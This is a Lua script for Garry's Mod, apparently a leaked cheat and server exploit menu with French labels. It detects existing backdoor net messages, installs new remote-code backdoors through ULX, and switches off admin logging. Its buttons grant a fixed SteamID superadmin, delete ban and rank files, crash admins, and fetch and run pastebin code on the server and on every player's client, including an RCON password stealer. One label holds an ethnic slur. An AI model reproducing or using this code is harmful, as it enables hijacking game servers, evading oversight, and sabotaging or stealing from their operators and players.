
-- ███▄▄▄▄    ▄██████▄  ▀████    ▐████▀    ▄███████▄  ▄█        ▄██████▄   ▄█      ███     
-- ███▀▀▀██▄ ███    ███   ███▌   ████▀    ███    ███ ███       ███    ███ ███  ▀█████████▄ 
-- ███   ███ ███    ███    ███  ▐███      ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ 
-- ███   ███ ███    ███    ▀███▄███▀      ███    ███ ███       ███    ███ ███▌     ███   ▀ 
-- ███   ███ ███    ███    ████▀██▄     ▀█████████▀  ███       ███    ███ ███▌     ███     
-- ███   ███ ███    ███   ▐███  ▀███      ███        ███       ███    ███ ███      ███     
-- ███   ███ ███    ███  ▄███     ███▄    ███        ███▌    ▄ ███    ███ ███      ███     
 -- ▀█   █▀   ▀██████▀  ████       ███▄  ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀   

-- Free Garry's Mod Exploit/Aimbot menu !
-- Go on https://noxploit.pro ! 

local Authorized = LocalPlayer():SteamID()
if Authorized == "VOTRE STEAM ID" or Authorized == "VOTRE STEAM ID"

then

local netKey = "";
local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);

function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end

-- CHECKER
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end

    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Leaked By Fuck ur Menus", "] ", Color( 255, 255, 255 ), "Aucune Backdoor Détécté" )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Leaked By Fuck ur Menus", "] ", Color( 0, 255, 0 ), "Backdoor Trouvée : ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs disabled." )
                end)
            end
    end
--END CHECKER

function Inject()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Leaked By Fuck ur Menus", "] ", Color( 255, 255, 255 ), " Injecting..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("SessionBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
				RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('SessionBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), " InjÃ©ctÃ© avec succÃ¨s !" )
            end
        end )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), " Erreur ! Vous n'Ãªtes pas SUPERADMIN !" )
    end
    if( ValidNetString("SessionBackdoor") ) then
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), " La backdoor est dÃ©jÃ  prÃ©sente." )
    end
end

function bhop()
local AddHook = dismay and dismay.AddHook or hook and hook.Add or function() print("fuck i missed") end;
AddHook("CreateMove", "BHOP", function(cmd)
        if (cmd:KeyDown(IN_JUMP)) then
                if(cmd:GetMouseX() < 0) then
                        cmd:SetSideMove(-10000);
                elseif(cmd:GetMouseX() > 0) then
                        cmd:SetSideMove(10000);
                end
        if (LocalPlayer():IsOnGround()) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
                        return;
        end
end
cmd:RemoveKey(IN_JUMP);
end)
end

surface.CreateFont("Font", {
font = "Segoe UI Light",
size = 21,
weight = 300
})
surface.CreateFont("CheckFont", {
font = "Segoe UI Light",
size = 17,
weight = 300
})

surface.CreateFont("SoundBoard", {
font = "Segoe UI Light",
size = 15,
weight = 300
})

function Session()
local Menu = vgui.Create("DFrame")
Menu:SetSize(900, 700)
Menu:Center()
Menu:SetTitle("")
Menu:MakePopup()
Menu:ShowCloseButton(false) 
Menu.Paint = function(self, w, h)
surface.SetDrawColor( 30, 30 , 30 )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )

    draw.DrawText( "FullMenu - 1.0 ", "Font", 10, 2, Color(42, 95, 177) )

    local inject = vgui.Create( "DButton", Menu )
        inject:SetPos( 700, 40 )
        inject:SetText( "Superadmin Inject" )
        inject:SetTextColor( Color(255, 255, 255, 255) )
        inject:SetSize( 180, 30 )
        inject.Paint = function()
            surface.SetDrawColor(30, 30, 30)
            surface.DrawRect( 0, 0, inject:GetWide(), inject:GetTall() )
            surface.SetDrawColor(15, 15, 15)
            surface.DrawOutlinedRect( 0, 0, inject:GetWide(), inject:GetTall() )
        end

    inject.DoClick = function()
        Inject()
    end
end

local Close = vgui.Create("DButton", Menu)
Close:SetPos( 842, 1 )
Close:SetSize( 53, 20 )
Close:SetText( "" )
function Close:Paint( w, h )
    draw.RoundedBoxEx( 4, 0, 0, w, h, Color(255,0,0) )
end

Close.DoClick = function()
    Menu:Close()  
end 
--------------------------------------------------------------
local Tabs = vgui.Create( "DPropertySheet", Menu )
Tabs:Dock( FILL )
Tabs:DockPadding( 5, 5, 0, 0)
Tabs.Paint = function (self, w, h)
for k, v in pairs(Tabs.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.LinearGradient( 0, 0, w, h, Color(20, 20, 20), Color(30, 30, 30), GRADIENT_VERTICAL );
         surface.SetDrawColor(15, 15, 15)
         surface.DrawOutlinedRect( 0, 0, v.Tab:GetWide(), v.Tab:GetTall() )
    end
end
end
 
local Controller = vgui.Create( "DPanel", Tabs )
    Controller.Paint = function( self, w, h )
        draw.RoundedBox(0, 0, 0, w, h, Color(15,15,15))
    end
Tabs:AddSheet( "Controller", Controller )
 

local Targets = vgui.Create( "DPanel", Tabs )
    Targets.Paint = function( self, w, h )
        draw.RoundedBox(0, 0, 0, w, h, Color(15,15,15))
    end
Tabs:AddSheet( "SoundBoard", Targets )

local Misc = vgui.Create( "DPanel", Tabs )
    Misc.Paint = function( self, w, h )
        draw.RoundedBox(0, 0, 0, w, h, Color(15,15,15))
    end
Tabs:AddSheet( "Misc", Misc )


local Controller = vgui.Create( "DScrollPanel", Controller )
Controller:Dock( FILL )
 
local Targets = vgui.Create( "DScrollPanel", Targets )
Targets:Dock( FILL )

local Misc = vgui.Create( "DScrollPanel", Misc )
Misc:Dock( FILL )
--------------------------------------------------------------

local Entry = vgui.Create( "DTextEntry" )
Entry:SetParent(Controller)
Entry:SetPos( 12, 530 )
Entry:SetSize( 230, 90 )
Entry:SetText( "" )

local RCON = vgui.Create("DButton", Controller )
RCON:SetSize( 110, 25 )
RCON:SetPos( 130, 500 )
RCON:SetText("RCON Command")
RCON:SetTextColor(Color(255, 255, 255, 255))
RCON.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
end

RCON.DoClick = function()
    local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (false)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "RCON Command sent." )
end

local GLUA = vgui.Create("DButton", Controller )
GLUA:SetSize( 110, 25 )
GLUA:SetPos( 15, 500 )
GLUA:SetText("Code LUA")
GLUA:SetTextColor(Color(255, 255, 255, 255))
GLUA.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
end

GLUA.DoClick = function()
local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (1)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Lua code sent." )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 30 )
Macro:SetText( "Se Metre SuperAdmin" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:110275909\", \"superadmin\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Add Superadmin :D." )
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Baiser le serveur" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:net.SendToServerLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:net.SendToServerLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:net.SendToServerLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:net.SendToServerLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:net.SendToServerLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Fuck up the server activated" )
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 90 )
Macro:SetText( "Deban tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Unbanned all players" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Bruler tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Ignited all players" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Supprimer les grades" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Ranks deleted" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Reboot" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("game.GetWorld():Remove()")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Restarting..." )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Hurlement" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://midou.mtxserv.fr/midou/HAAAAAAA.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Ear raped" )
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Changer models" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playernet.Start.mdl\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Players models changed" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Baiser la physic" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Physic raped" )
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "InversÃ© la gravitÃ©" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Gravity reversed" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Reset argent" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Money reset" )
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Pousser tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Pushed everybody" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Crash admins" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:net.SendToServerLua(\"while true do end\") end end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Admins crashed" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Mode Arabe niqueur de serveur" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/jzXzv9Vg\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Dancing Skeletons activated" )
end
 
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "10$ toutes les 0.1s" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10) end) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "10$ every 0.1s activated" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "RCON stealer (HS)" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "https://pastebin.com/raw/SUTRqbhX" )
net.WriteBit (1)
net.SendToServer()
    timer.Simple( 0.5, function()
        if ValidNetString( "rcon" ) then
            net.Start("rcon")
            net.SendToServer()
        else
            chat.AddText( Color(255, 0, 0),"Rcon password not found, please retry." )
        end
    end)
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Cleanup" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Map cleaned up" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Shutdown" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "timer.Create( \"spamlol\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"Owned by Jesus & Zilnix\") end end)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Shutdown..." )
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 140, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Effacer les donnÃ©es" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:net.SendToServerLua([[http.Fetch('https://pastebin.com/raw/UqB7Nap5',function(b,l,h,c)RunString(b)end,nil)]]) end " )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[Session | leaked by Fuck ur menus] ", Color( 255, 255, 255 ), "Datas wiped" )
end

